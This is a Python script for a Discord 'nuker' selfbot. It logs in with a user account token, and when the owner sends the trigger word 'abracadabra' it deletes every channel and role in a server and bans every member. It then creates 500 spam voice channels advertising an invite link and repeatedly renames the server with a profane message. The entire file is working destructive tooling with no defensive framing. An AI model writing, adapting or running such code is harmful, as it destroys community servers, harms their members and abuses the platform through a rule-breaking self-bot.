import discord, asyncio

d = discord.Client()

token = ""

@d.event
async def on_ready():
    def login():
        print(f"[*] Logged in as {d.user}")
        print(f"      + Email -> {d.user.email}")
        print(f"      + ID    -> {d.user.id}\n")
    login()

async def delchan(channel):
    try:
        print(f"[+] Deleted channel: #{channel.name}")
        await channel.delete()
    except:
        print(f"[!] Couldn't delete #{channel.name}")

async def magic(user):
    try:
        await user.ban()
        print(f"[+] Banned user: @{user.name}#{user.discriminator}")
    except:
        print(f"[!] Couldn't ban @{user.name}#{user.discriminator}")

async def delrole(role):
    try:
        await role.delete()
        print(f"[+] Deleted role: {role.name}")
    except:
        pass

@d.event
async def on_message(message):
    guild = message.guild
    fucked = 0
    if message.content.startswith('abracadabra') and message.author == d.user:
        print(f"[!] WARNING: You're about to nuke {guild.name}")
        verification = input("[?] Proceed task? (y/n): ")
        if verification == 'n':
            print(f"[!] Operation cancelled.")
        elif verification == 'y':
            for channel in list(guild.channels):
                fucked += 1
                await delchan(channel)
                await guild.edit(name="SERVER FUCKED {} TIMES".format(fucked))
            for u in list(guild.members):
                fucked += 1
                await magic(u)
                await guild.edit(name="SERVER FUCKED {} TIMES".format(fucked))
            for r in list(guild.roles):
                await delrole(r)
                await guild.edit(name="SERVER FUCKED {} TIMES".format(fucked))
            for _ in range(500):
                fucked += 1
                await guild.create_voice_channel(name='discord.gg/japan')
                await guild.edit(name="SERVER FUCKED {} TIMES".format(fucked))
            print(f"[+] Your magic trick is done. Fully nuked the targeted server")

d.run(token, bot=False)
